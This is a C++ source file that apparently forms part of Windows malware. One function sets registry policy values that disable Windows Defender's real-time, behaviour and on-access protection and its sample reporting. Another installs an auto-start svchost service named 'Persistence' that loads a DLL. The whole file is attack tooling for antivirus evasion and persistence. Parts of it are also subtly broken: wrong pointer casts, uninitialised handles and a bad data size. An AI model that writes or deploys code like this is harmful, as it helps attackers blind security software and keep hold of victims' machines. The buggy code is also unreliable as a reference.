#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <map>
#include <iostream>
#include <winreg.h>
#include <winsvc.h>

HKEY HKLM = HKEY_LOCAL_MACHINE;
std::map<LPCWSTR, std::map<LPCWSTR, DWORD>> registryEntries = {
	{L"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
		{L"DisableAntiSpyware", 1},
		{L"DisableRoutinelyTakingAction", 1},
		{L"DisableRealtimeMonitoring", 1},
		{L"DisableAntiVirus", 1},
		{L"DisableSpecialRunningModes", 1},
		{L"ServiceKeepAlive", 0}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", {
		{L"DisableAntiSpyware", 1},
		{L"DisableRoutinelyTakingAction", 1},
		{L"DisableRealtimeMonitoring", 1},
		{L"DisableAntiVirus", 1},
		{L"DisableSpecialRunningModes", 1},
		{L"ServiceKeepAlive", 0}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", {
		{L"SpyNetReporting", 0},
		{L"SubmitSamplesConsent", 0},
		{L"DisableBlockAtFirstSeen", 1}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\MRT", {
		{L"DontReportInfectionInformation", 1}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", {
		{L"ForceUpdateFromMU", 0}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", {
		{L"DisableRealtimeMonitoring", 1},
		{L"DisableOnAccessProtection", 1},
		{L"DisableBehaviorMonitoring", 1},
		{L"DisableScanOnRealtimeEnable", 1},
	}}
};
LPCWSTR dllPath = L"";


int wmain() {
	if (DisableDefender() != 0) {
		// disabling defender failed
	}

	// create working directory

	if (CreatePersistService() != 0) {
		// creating persistent service failed
	}

	// start service
}

int DisableDefender() {
	std::map<LPCWSTR, std::map<LPCWSTR, DWORD>>::iterator outer;
	std::map<LPCWSTR, DWORD>::iterator inner;

	for (outer = registryEntries.begin(); outer != registryEntries.end(); outer++) {
		for (inner = outer->second.begin(); inner != outer->second.end(); inner++) {

			LSTATUS s;
			HKEY key;

			s = RegCreateKeyExW(
				HKLM,
				outer->first,
				0,
				NULL,
				REG_OPTION_NON_VOLATILE,
				KEY_ALL_ACCESS,
				NULL,
				&key,
				NULL
				);
			if (s != ERROR_SUCCESS) {
				std::wcout << L"opening key failed " << outer->first << L" " << inner->first << std::endl;
				return 1;
			}

			s = RegSetValueExW(
				key,
				inner->first,
				0,
				REG_DWORD,
				reinterpret_cast<BYTE *>(inner->second),
				sizeof(DWORD)
			);
			if (s != ERROR_SUCCESS) {
				std::wcout << L"writing key failed " << outer->first << L" " << inner->first << std::endl;
				return 2;
			}
		}
	}

	return 0;
}

int CreatePersistService() {
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	std::unique_ptr<void, decltype(&CloseHandle)> uphSCManager(static_cast<void*>(hSCManager), CloseHandle);
	std::unique_ptr<void, decltype(&CloseHandle)> uphService(static_cast<void*>(hService), CloseHandle);

	// open service manager
	hSCManager = OpenSCManagerW(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);

	if (hSCManager == NULL) {
		return 1;
	}

	// create the service
	hService = CreateServiceW(
		hSCManager,
		L"Persistence",
		L"Persistence",
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_SHARE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		L"C:\\Windows\\System32\\svchost.exe -k WinSysPersist",
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (hService == NULL) {
		return 2;
	}
	
	// configure the service dll path
	HKEY hKey;
	LSTATUS s = RegCreateKeyExW(
		HKLM,
		L"SYSTEM\\CurrentControlSet\\services\\Persistence\\Parameters",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		NULL,
		&hKey,
		NULL
	);

	if (s != ERROR_SUCCESS) {
		
		return 3;
	}

	s = RegSetKeyValueW(
		hKey,
		NULL,
		L"ServiceDll",
		REG_EXPAND_SZ,
		dllPath,
		sizeof(LPCWSTR)+1
	);

	// optionally set service group

	return 0;
}